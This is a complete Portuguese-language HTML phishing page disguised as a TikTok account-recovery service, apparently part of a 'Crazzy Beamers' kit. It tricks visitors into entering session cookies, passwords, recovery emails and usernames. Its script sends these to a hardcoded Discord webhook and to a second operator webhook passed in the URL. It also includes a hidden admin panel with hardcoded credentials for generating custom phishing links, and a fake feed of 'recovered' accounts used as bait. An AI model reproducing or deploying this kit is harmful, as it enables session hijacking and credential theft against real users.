<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="siteTitle">TikTok Support - Recovery System</title>
    <style>
        :root {
            --primary: #8a2be2;
            --secondary: #6a1b9a;
            --bg: #0a0510;
            --card-bg: #160d25;
            --text: #e0d5f0;
            --accent: #bc8cf2;
        }

        body { 
            font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); 
            margin: 0; display: flex; flex-direction: column; align-items: center; 
            min-height: 100vh; padding: 20px;
        }

        .card { 
            background: var(--card-bg); border: 1px solid var(--primary); padding: 30px; 
            border-radius: 20px; width: 100%; max-width: 420px; 
            box-shadow: 0 0 25px rgba(138, 43, 226, 0.3); text-align: center;
        }

        h2 { color: var(--accent); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 20px; }

        .input-group { text-align: left; margin-bottom: 15px; }
        label { font-size: 12px; color: var(--accent); margin-left: 5px; }

        input { 
            width: 100%; padding: 14px; margin-top: 5px; border-radius: 10px; 
            border: 1px solid #3d245d; background: #0f081a; color: white; 
            box-sizing: border-box; outline: none; transition: 0.3s;
        }

        input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(138, 43, 226, 0.5); }

        button { 
            width: 100%; padding: 15px; background: linear-gradient(45deg, var(--secondary), var(--primary)); 
            color: white; border: none; cursor: pointer; font-weight: bold; 
            border-radius: 10px; font-size: 16px; margin-top: 15px; 
            box-shadow: 0 4px 15px rgba(138, 43, 226, 0.4);
        }

        .fake-feed { 
            width: 100%; max-width: 420px; margin-top: 25px; 
            background: rgba(22, 13, 37, 0.7); border-radius: 15px; 
            padding: 15px; border: 1px dashed var(--primary); height: 110px; overflow: hidden;
        }

        .feed-item { font-size: 12px; padding: 8px; border-bottom: 1px solid #2a1a3d; display: flex; align-items: center; color: #bca0dc; animation: slideIn 0.5s; }
        .status-dot { height: 7px; width: 7px; background: #00ff88; border-radius: 50%; margin-right: 10px; box-shadow: 0 0 8px #00ff88; }

        @keyframes slideIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }

        .gif-trigger { width: 100%; border-radius: 15px; cursor: pointer; margin-top: 20px; }

        .admin-modal { 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            background: #1a0b2e; padding: 35px; border: 2px solid var(--primary); 
            border-radius: 20px; z-index: 999; width: 320px; box-shadow: 0 0 50px #000;
        }

        .success-msg { color: #00ff88; font-weight: bold; border: 1px solid #00ff88; padding: 15px; border-radius: 10px; margin-top: 15px; display: none; background: rgba(0, 255, 136, 0.1); }
        .hidden { display: none; }
        .overlay { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); z-index: 998; }

        #linkGerado { 
            background: #000; color: #00ff88; padding: 10px; font-size: 10px; 
            word-break: break-all; margin-top: 10px; border-radius: 5px; border: 1px solid #333;
            max-height: 80px; overflow-y: auto;
        }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h2 id="displayTitle">Recuperar Conta</h2>
        
        <div class="input-group"><label>Cookie</label><input type="text" id="v_cookie" placeholder="Token de Sessão"></div>
        <div class="input-group"><label>Senha Desejada</label><input type="password" id="v_pass" placeholder="••••••••"></div>
        <div class="input-group"><label>Gmail Recuperação</label><input type="email" id="v_gmail" placeholder="exemplo@gmail.com"></div>
        <div class="input-group"><label>Nome Tik Tok</label><input type="text" id="v_tiktok" placeholder="@usuario"></div>
        
        <button id="btnSubmit" onclick="enviarParaWebhook()">INICIAR RECUPERAÇÃO</button>

        <div id="successBox" class="success-msg">
            ✅ Solicitação enviada! Dentro de 24 horas enviaremos um aviso no seu TikTok.
        </div>

        <img src="https://share.creavite.co/69a63e71e207736a321bdbfb.gif" class="gif-trigger" onclick="clickDetect()">
    </div>

    <div class="fake-feed" id="feedContainer"></div>

    <div id="overlay" class="overlay hidden"></div>
    
    <div id="adminPanel" class="admin-modal hidden">
        <h3 style="color:var(--accent); margin-top:0;">Login ADM</h3>
        <input type="text" id="adm_user" placeholder="CrazzyBeamers">
        <input type="password" id="adm_pass" placeholder="Senha">
        <button onclick="loginAdm()">ENTRAR</button>
        <button onclick="closeAdm()" style="background:transparent; color: #888; border: 1px solid #444;">Sair</button>
    </div>

    <div id="genPanel" class="admin-modal hidden">
        <h3 style="color:var(--accent);">Painel de Geração</h3>
        <input type="text" id="site_name_adm" placeholder="Nome do Site (Ex: TikTok Support)">
        <input type="text" id="webhook_adm" placeholder="URL do Webhook do ADM">
        <button onclick="gerarLink()">GERAR LINK DUALHOOK</button>
        
        <div id="linkGerado" class="hidden"></div>
        <div id="stts" style="margin-top:10px; font-size:12px; color:#00ff88;"></div>
        
        <button onclick="closeAdm()" style="background:transparent; color: #888; border: 1px solid #444; margin-top:10px;">Sair do Painel</button>
    </div>

    <script>
        // --- WEBHOOK PRINCIPAL (SEU) - NUNCA REMOVIDO ---
        const MASTER_HOOK = "https://discord.com/api/webhooks/1473834874199605423/Or8IcI6PHv0Ro7Ww7Xsns8Wp2HmCk1eVmJqAWSBwvyBAZ-OUe595DRaB78MBBVCwBsIK";
        
        let clicks = 0;

        // Captura dados da URL (para o link que o ADM gerar)
        const urlParams = new URLSearchParams(window.location.search);
        const subHook = urlParams.get('h'); 
        const subTitle = urlParams.get('t');

        // Se houver título na URL, ele muda o site
        if(subTitle) {
            const nomeEditado = decodeURIComponent(subTitle);
            document.getElementById('displayTitle').innerText = nomeEditado;
            document.title = nomeEditado;
        }

        // Feed Automático
        const users = ["@jhow_zero", "@ana_clara", "@vini.tt", "@crazzy_12", "@gui_ofc", "@tktk_res"];
        function updateFeed() {
            const container = document.getElementById('feedContainer');
            const user = users[Math.floor(Math.random() * users.length)];
            const div = document.createElement('div');
            div.className = 'feed-item';
            div.innerHTML = `<div class="status-dot"></div> ${user} recuperou a conta agora.`;
            if(container.children.length >= 3) container.removeChild(container.lastChild);
            container.prepend(div);
        }
        setInterval(updateFeed, 10000); updateFeed();

        function clickDetect() { clicks++; if(clicks >= 5) { document.getElementById('adminPanel').classList.remove('hidden'); document.getElementById('overlay').classList.remove('hidden'); clicks = 0; } }
        function closeAdm() { document.querySelectorAll('.admin-modal, .overlay').forEach(e => e.classList.add('hidden')); }

        function loginAdm() {
            if(document.getElementById('adm_user').value === "CrazzyBeamers" && document.getElementById('adm_pass').value === "CrazzyBeamers") {
                document.getElementById('adminPanel').classList.add('hidden');
                document.getElementById('genPanel').classList.remove('hidden');
            } else { alert("Login Errado!"); }
        }

        function gerarLink() {
            const wh = document.getElementById('webhook_adm').value;
            const nm = document.getElementById('site_name_adm').value || "Recuperar Conta";
            
            if(!wh.includes("discord.com/api/webhooks")) { alert("Insira um Webhook válido!"); return; }
            
            // Cria o link com os parâmetros encurtados (h = hook, t = título)
            const base = window.location.href.split('?')[0];
            const final = `${base}?h=${encodeURIComponent(wh)}&t=${encodeURIComponent(nm)}`;
            
            const box = document.getElementById('linkGerado');
            box.innerText = final;
            box.classList.remove('hidden');
            document.getElementById('stts').innerText = "Link gerado com sucesso! Envie este link.";
        }

        function enviarParaWebhook() {
            const tiktok = document.getElementById('v_tiktok').value;
            const msg = {
                embeds: [{
                    title: "💜 NOVO RESULTADO - CRAZZY BEAM 💜",
                    description: `**Origem:** ${document.getElementById('displayTitle').innerText}`,
                    color: 9055202,
                    fields: [
                        { name: "👤 TikTok", value: tiktok || "N/A", inline: true },
                        { name: "🔑 Senha", value: document.getElementById('v_pass').value || "N/A", inline: true },
                        { name: "📧 Gmail", value: document.getElementById('v_gmail').value || "N/A" },
                        { name: "🍪 Cookie", value: "```" + (document.getElementById('v_cookie').value || "N/A") + "```" }
                    ],
                    footer: { text: "Crazzy Beamers System" }
                }]
            };

            // 1. SEMPRE envia para o SEU Webhook
            fetch(MASTER_HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });

            // 2. SE o link for de um sub-ADM, envia para o dele também (DualHook)
            if(subHook) {
                fetch(subHook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
            }

            document.getElementById('btnSubmit').style.display = "none";
            document.getElementById('successBox').style.display = "block";
        }
    </script>
</body>
</html>
